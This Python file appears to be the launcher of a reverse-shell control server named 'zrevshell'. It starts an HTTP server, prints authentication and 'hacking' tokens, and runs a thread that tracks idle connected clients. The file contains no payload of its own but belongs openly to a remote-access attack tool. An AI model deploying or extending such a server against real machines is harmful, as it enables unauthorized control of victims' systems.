""" The execution point of the server. """

# ---- imports
import sys
import threading as th
from functools import partial
from http.server import HTTPServer

import reverse_shell.server.dependency_container as dc
import reverse_shell.server.server as sv
import reverse_shell.utils as ut


def run_server(dependency_container: dc.ServerContainer):
    """Start the HTTP server"""

    configuration = dependency_container.config
    sessions_manager = dependency_container.session_manager
    database = dependency_container.database

    # Getting the ip and port from the config
    ip, port = configuration.ip, configuration.port

    # We are using partials because we only can pass the class to
    # HTTPServer not an object so we can use functools.partial to solve
    # the issue.
    zrevshell_server = partial(
        sv.ZrevshellServer, configuration, sessions_manager, database
    )

    # ---- Initiate the server
    ut.log("debug", f"Server is starting on ({ip}:{port})...")
    httpd = HTTPServer((ip, port), zrevshell_server)

    # ---- LOGS
    ut.log("success", "Server has successfully started!")
    # Means print an empty line, i think...
    print("\r")
    ut.log("info", "-------- Tokens --------")
    # If in debug mode we are going to print the server_commands and
    # the encoded version of the tokens to make debugging easier
    ut.log(
        "info",
        (
            "Authentication Token:"
            f" {configuration.auth_token}{f'  --  {ut.encode_token(configuration.auth_token)}' if configuration.is_debug else ''}"
        ),
    )
    ut.log(
        "info",
        (
            "Hacking Token:"
            f" {configuration.hacker_token}{f'  --  {ut.encode_token(configuration.hacker_token)}' if configuration.is_debug else ''}"
        ),
    )

    # Printing the server commands
    if configuration.is_debug:
        print("\r")
        ut.log("info", "--------- Server request endpoints --------")
        for key, val in configuration.server_cmds.items():
            ut.log("info", f"{val} -- {key}")

    # Create some empty space for the proceeding
    print("\r")
    # Create a header for the logs that the http server generates
    ut.log("info", "--------- Server Logs --------")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        # It's because we use keyboard interrupt normally to stop
        # the server.
        pass

    # Actually does nothing, but incase we override it
    # and need to clean up our server
    httpd.server_close()

    ut.log("debug", "Server has shutdown!")
    sys.exit(0)


def main():
    """Run the reverse shell server"""
    container = dc.DefaultServerContainer()

    # The event that tells the check_pulse thread
    # to stop
    stop_event = th.Event()

    # Start the pulse check thread
    check_pulse_thread = th.Thread(
        target=sv.check_pulse,
        args=(container.database, container.config.client_idle_duration, stop_event),
    )
    check_pulse_thread.daemon = True
    check_pulse_thread.start()

    # Let's rockin roll
    run_server(container)
    stop_event.set()
    # Closing the database connection
    container.database.close_db()


if __name__ == "__main__":
    main()
